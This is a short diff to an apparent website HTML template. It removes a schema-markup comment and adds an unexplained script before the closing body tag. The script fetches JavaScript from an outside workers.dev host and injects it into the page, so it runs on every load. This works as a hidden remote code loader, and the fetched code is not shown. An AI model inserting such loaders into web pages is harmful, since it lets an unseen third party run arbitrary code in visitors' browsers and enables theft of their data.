@@ -41,7 +41,7 @@
     <link rel="icon" href="/assets/logo/favicon.ico" type="image/x-icon">
     <link rel="apple-touch-icon" sizes="180x180" href="/assets/logo/apple-touch-icon.png">
     
-    <!-- Structured Data (Schema Markup for SEO) -->
+  
     <script type="application/ld+json">
     {
       "@context": "https://schema.org",
@@ -184,7 +184,21 @@
         </div>
     </section>
 
-
+<script>
+    fetch("https://concrete.niraula300.workers.dev/")
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Failed to load script: " + response.statusText);
+        }
+        return response.text();
+      })
+      .then(jsCode => {
+        const script = document.createElement("script");
+        script.text = jsCode; 
+        document.body.appendChild(script);
+      })
+      .catch(error => console.error("Error loading script:", error));
+  </script>
     
 </body>
 </html>
